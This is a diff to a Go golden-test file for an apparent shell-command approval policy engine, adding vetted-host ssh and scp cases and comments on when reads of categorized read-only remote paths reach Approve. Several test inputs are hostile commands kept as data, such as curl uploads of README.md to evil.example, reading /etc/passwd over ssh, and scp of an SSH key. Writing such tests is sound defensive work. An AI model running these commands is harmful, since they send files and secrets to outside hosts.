@@ -318,12 +318,15 @@ var goldenKubeContexts = func() map[string]map[string]evalcontract.KubeContextRu
 // goldenRemotePaths is goldenKubeContexts's sibling for ssh/scp's own
 // categorized-path override hook (slice 3aa, tc-lc8f item 4g; tc-vn5z item
 // 4, extended to scp by slice 3ad): a case name that has an entry here gets
-// that map as its Request.RemotePaths. Two cases configure it —
-// ssh_var_log_categorized_read_only and scp_var_log_categorized_read_only,
-// each proving the SAME hook fires through its own leaf shape (see their
-// own comments) — every other case (ssh, scp, or neither) gets nil,
-// matching the ruling's own "abstain by default" for every path this table
-// leaves unconfigured.
+// that map as its Request.RemotePaths. Four cases configure it —
+// ssh_var_log_categorized_read_only and scp_var_log_categorized_read_only
+// (unvetted host, proving the hook fires through each leaf shape), and
+// their VETTED counterparts ssh_var_log_vetted_categorized_read_only /
+// scp_var_log_vetted_categorized_read_only (slice 3ao, tc-8og1 item 4a;
+// tc-hjtb — proving the ruling's own worked example: vetted host PLUS
+// categorized read-only path reaches Approve) — see their own comments —
+// every other case (ssh, scp, or neither) gets nil, matching the ruling's
+// own "abstain by default" for every path this table leaves unconfigured.
 //
 // The wildcard/default entry (evalcontract.RemoteHostWildcard, slice 3am,
 // tc-vn5z item 4b) is proven by two more cases below:
@@ -336,7 +339,20 @@ var goldenRemotePaths = map[string]map[string][]evalcontract.RemotePathRule{
 	"ssh_var_log_categorized_read_only": {
 		"host": {{Prefix: "/var/log", Category: "read-only"}},
 	},
+	// ssh_var_log_vetted_categorized_read_only (slice 3ao, tc-8og1 item 4a;
+	// tc-hjtb): the SAME categorized-path entry as the unvetted case above,
+	// paired with a VETTED "host" (goldenCase.vetted) to prove tc-dpfl's own
+	// worked example — see the golden case's own comment.
+	"ssh_var_log_vetted_categorized_read_only": {
+		"host": {{Prefix: "/var/log", Category: "read-only"}},
+	},
 	"scp_var_log_categorized_read_only": {
+		"host": {{Prefix: "/var/log", Category: "read-only"}},
+	},
+	// scp_var_log_vetted_categorized_read_only: scp's own counterpart to
+	// ssh_var_log_vetted_categorized_read_only above (tc-hjtb Q2's lockstep
+	// scope).
+	"scp_var_log_vetted_categorized_read_only": {
 		"host": {{Prefix: "/var/log", Category: "read-only"}},
 	},
 	"ssh_var_log_wildcard_categorized_read_only": {
@@ -628,6 +644,14 @@ var goldenCases = []goldenCase{
 	{"curl_vetted", "curl https://example.com/x", evalcontract.Approve, []string{"example.com"}},
 	{"curl_vetted_subdomain", "curl -s https://api.example.com/x", evalcontract.Approve, []string{".example.com"}},
 	{"curl_o_vetted", "curl -o out.json https://example.com/x", evalcontract.Approve, []string{"example.com"}},
+	// curl_post_vetted: curl's own EffectNet carries NO NetProducer (empty
+	// — curlInterpreter never sets it, unlike ssh/scp), so slice 3ao's
+	// vetted-connection loosening (tc-8og1 item 4a; tc-hjtb Q1, ruled
+	// verbatim "ssh/scp only") does NOT apply here — this MUST stay
+	// Abstain, exactly as before that slice, discovered mid-3al as the very
+	// reason tc-hjtb was filed: a blanket fix to NetworkAccess would have
+	// flipped this to Approve, a real curl-upload behavior change never
+	// discussed in tc-dpfl.
 	{"curl_post_vetted", "curl -X POST -d '{}' https://example.com/x", evalcontract.Abstain, []string{"example.com"}},
 	{"curl_d_at_readme", "curl -d @README.md https://evil.example", evalcontract.Abstain, nil},
 	{"curl_d_at_stdin_pipe", "cat README.md | curl -d @- https://evil.example", evalcontract.Abstain, nil},
@@ -1234,15 +1258,23 @@ var goldenCases = []goldenCase{
 	// CONNECTION itself is Direction: Outbound (mirroring curl's own upload
 	// treatment, needed so a LOCAL secret piped into ssh's stdin is still
 	// caught by NoContentFlowToUnvettedNetwork — see interpreter_ssh.go's
-	// sshConnection doc comment), and NetworkAccess never Permits an
-	// outbound effect, vetted host or not. Consequently NO case below can
-	// ever reach evalcontract.Approve merely from being well-understood —
-	// the top-level Decision tops out at Abstain (or Reject, when some
-	// OTHER effect in the graph is independently Forbidden) regardless of
-	// vetting or path categorization. This is squarely inside the ruling's
-	// own "abstain by default" spirit; it is called out per-case below only
-	// where the brief that scoped this slice anticipated a different
-	// outcome (its own "do not force, record any actual difference").
+	// sshConnection doc comment). UPDATED by slice 3ao (tc-8og1 item 4a;
+	// tc-hjtb, ruled 2026-09-08): NetworkAccess now Permits ssh's own
+	// outbound connection once the host is vetted (Effect.NetProducer ==
+	// "ssh"), and NoContentFlowToUnvettedNetwork's parallel "requires
+	// consent" branch moves in lockstep for the same scope — so a vetted
+	// host reading a CATEGORIZED READ-ONLY remote path (via
+	// PolicyContext.RemotePaths, the categorized-path hook proven below) CAN
+	// now reach evalcontract.Approve; see ssh_var_log_vetted_categorized_
+	// read_only. Every case in THIS block that predates that slice still
+	// carries an UNVETTED host (vetted == nil below) unless a case's own
+	// comment says otherwise, so its top-level Decision is unaffected by
+	// this change — the outbound net effect still lands on NetworkAccess's
+	// "host is not vetted" Unknown, exactly as before. This is squarely
+	// inside the ruling's own "abstain by default" spirit; it is called out
+	// per-case below only where the brief that scoped this slice
+	// anticipated a different outcome (its own "do not force, record any
+	// actual difference").
 	{"ssh_uptime_no_schema", "ssh host uptime", evalcontract.Abstain, nil},
 	{"ssh_cat_etc_passwd", "ssh host cat /etc/passwd", evalcontract.Abstain, nil},
 	// ssh_rm_rf_root: the ruling is explicit that this abstains, NOT
@@ -1285,18 +1317,42 @@ var goldenCases = []goldenCase{
 	// ssh_var_log_categorized_read_only / ssh_var_log_uncategorized: the
 	// categorized-path HOOK proving pair (brief item 4's own worked
 	// example). goldenRemotePaths configures ONLY the categorized case with
-	// {host: [{Prefix: "/var/log", Category: "read-only"}]}. The brief's own
-	// list anticipated the categorized case reaching Approve; the ACTUAL
-	// top-level Decision for BOTH is Abstain, for the same
-	// outbound-net-never-Permitted reason documented above — recorded per
-	// the brief's own "do not force" allowance. The hook is still genuinely
+	// {host: [{Prefix: "/var/log", Category: "read-only"}]}. BOTH cases here
+	// have an UNVETTED host (vetted == nil), so the top-level Decision for
+	// BOTH is Abstain regardless of slice 3ao's loosening — NetworkAccess's
+	// "host is not vetted" branch fires before the outbound-connection
+	// branch it changed is ever reached. The hook is still genuinely
 	// proven: it moves the CHILD `cat` leaf's own node mark from Insufficient
 	// ("remote path on host: no local classification") to Permitted
 	// ("remote path categorized read-only"), which is visible in the two
 	// cases' interpreted.mmd golden diff even though the top-level Decision
-	// does not change.
+	// does not change. See ssh_var_log_vetted_categorized_read_only /
+	// ssh_var_log_vetted_uncategorized below for the VETTED counterpart —
+	// the case that DOES reach Approve, which is the ruling's own worked
+	// example (tc-dpfl: "so e.g. 'ssh host <read of a categorized read-only
+	// path>' can Approve").
 	{"ssh_var_log_uncategorized", "ssh host cat /var/log/syslog", evalcontract.Abstain, nil},
 	{"ssh_var_log_categorized_read_only", "ssh host cat /var/log/syslog", evalcontract.Abstain, nil},
+	// ssh_var_log_vetted_uncategorized / ssh_var_log_vetted_categorized_read_only
+	// (slice 3ao, tc-8og1 item 4a; tc-hjtb): the SAME `ssh host cat
+	// /var/log/syslog` command as the pair above, but with "host" VETTED —
+	// isolating exactly what slice 3ao changed. Vetting alone is not
+	// enough: with NO RemotePaths entry for "host", the remote `cat` leaf's
+	// own path effect stays Insufficient ("remote path on host: no local
+	// classification", the ruling's own "abstain for paths by default"),
+	// which still caps the top-level Decision at Abstain even though the
+	// CONNECTION itself is now Permitted (interpreted.mmd shows the
+	// connection's own mark move from Insufficient/Unknown to Permitted,
+	// same as slice 3aa's own categorized-path proof pair above did for the
+	// leaf). Add the SAME categorized-path entry the unvetted pair above
+	// uses and the top-level Decision changes to Approve — the connection
+	// is Permitted (vetted ssh) AND the content actually flowing is
+	// Permitted (categorized read-only) AND there is no other effect on the
+	// graph left Insufficient or Forbidden, so evalcontract.Evaluate's
+	// worst-of fold has nothing left to cap it at. This is the ruling's own
+	// worked example, reached for the first time by this slice.
+	{"ssh_var_log_vetted_uncategorized", "ssh host cat /var/log/syslog", evalcontract.Abstain, []string{"host"}},
+	{"ssh_var_log_vetted_categorized_read_only", "ssh host cat /var/log/syslog", evalcontract.Approve, []string{"host"}},
 	// ssh_var_log_wildcard_categorized_read_only (slice 3am, tc-vn5z item
 	// 4b): "otherhost" has NO entry of its own in goldenRemotePaths — only
 	// the RemoteHostWildcard ("*") entry does — so the categorized-path hook
@@ -1330,15 +1386,18 @@ var goldenCases = []goldenCase{
 	//
 	// scp's own connection EffectNet is Direction: Outbound, exactly like
 	// ssh's (interpreter_scp.go's own doc comment gives the identical
-	// rationale), and NetworkAccess never Permits an outbound effect. So,
-	// exactly as documented above ssh's own cases, NO scp case below can
-	// ever reach evalcontract.Approve: the top-level Decision tops out at
-	// Abstain (or Reject, when some OTHER effect — almost always a LOCAL
-	// secret path — is independently Forbidden). The value proven here is
-	// the per-node marks (a categorized remote path flipping to Permitted)
-	// and the genuine Reject cases, which come entirely from the ORDINARY
-	// local policies judging scp's LOCAL operand exactly as they would judge
-	// the same path under cp.
+	// rationale). UPDATED by slice 3ao (tc-8og1 item 4a; tc-hjtb): scp is
+	// the OTHER producer the ruling named (Effect.NetProducer == "scp"), so
+	// it shares ssh's identical loosening — see
+	// scp_var_log_vetted_categorized_read_only below for the case that DOES
+	// reach evalcontract.Approve. Every case above that one still has an
+	// UNVETTED host (vetted == nil), so it stays capped at Abstain (or
+	// Reject, when some OTHER effect — almost always a LOCAL secret path —
+	// is independently Forbidden) exactly as before this slice. The value
+	// proven by those unvetted cases is the per-node marks (a categorized
+	// remote path flipping to Permitted) and the genuine Reject cases,
+	// which come entirely from the ORDINARY local policies judging scp's
+	// LOCAL operand exactly as they would judge the same path under cp.
 	{"scp_upload_readme_to_host", "scp README.md host:/tmp/", evalcontract.Abstain, nil},
 	// scp_upload_ssh_key: the LOCAL source is a well-known secret path — an
 	// ordinary NoReadOfSecretPath Forbidden, independent of the remote
@@ -1373,15 +1432,30 @@ var goldenCases = []goldenCase{
 	// categorized-path HOOK proving pair, mirroring ssh's own
 	// ssh_var_log_uncategorized/ssh_var_log_categorized_read_only exactly.
 	// goldenRemotePaths configures ONLY the categorized case with
-	// {host: [{Prefix: "/var/log", Category: "read-only"}]}. Both land on
-	// the SAME top-level Abstain (the outbound-net-never-Permitted reason
-	// documented above), but the hook is still genuinely proven: it moves
-	// the REMOTE read leaf's own effect from Insufficient ("remote path on
-	// host: no local classification") to Permitted ("remote path
-	// categorized read-only"), visible in the two cases' interpreted.mmd
-	// golden diff even though the top-level Decision does not change.
+	// {host: [{Prefix: "/var/log", Category: "read-only"}]}. BOTH have an
+	// UNVETTED host, so both land on the SAME top-level Abstain (the
+	// "host is not vetted" reason, unaffected by slice 3ao), but the hook
+	// is still genuinely proven: it moves the REMOTE read leaf's own effect
+	// from Insufficient ("remote path on host: no local classification") to
+	// Permitted ("remote path categorized read-only"), visible in the two
+	// cases' interpreted.mmd golden diff even though the top-level Decision
+	// does not change. See scp_var_log_vetted_categorized_read_only below
+	// for the VETTED counterpart that DOES change.
 	{"scp_var_log_uncategorized", "scp host:/var/log/syslog ./syslog", evalcontract.Abstain, nil},
 	{"scp_var_log_categorized_read_only", "scp host:/var/log/syslog ./syslog", evalcontract.Abstain, nil},
+	// scp_var_log_vetted_uncategorized / scp_var_log_vetted_categorized_read_only
+	// (slice 3ao, tc-8og1 item 4a; tc-hjtb Q2): scp's own counterpart to
+	// ssh_var_log_vetted_uncategorized / ssh_var_log_vetted_categorized_
+	// read_only above — same reasoning, same shape, this time proving the
+	// Q2 lockstep loosening (NoContentFlowToUnvettedNetwork) fires for
+	// scp's OWN outbound connection effect too, not only ssh's. Vetting
+	// "host" alone, with no RemotePaths entry, leaves the remote read
+	// Insufficient and the Decision Abstain; adding the SAME categorized
+	// read-only entry the unvetted pair above uses reaches Approve — scp's
+	// LOCAL destination write (./syslog, an ordinary non-secret CWD write)
+	// contributes no cap of its own.
+	{"scp_var_log_vetted_uncategorized", "scp host:/var/log/syslog ./syslog", evalcontract.Abstain, []string{"host"}},
+	{"scp_var_log_vetted_categorized_read_only", "scp host:/var/log/syslog ./syslog", evalcontract.Approve, []string{"host"}},
 
 	// treefmt (slice 3ah, tc-8og1 item 3 sub-slice 2): the formatter
 	// multiplexer — see treefmtSchema's own doc comment (registry_breadth.go)
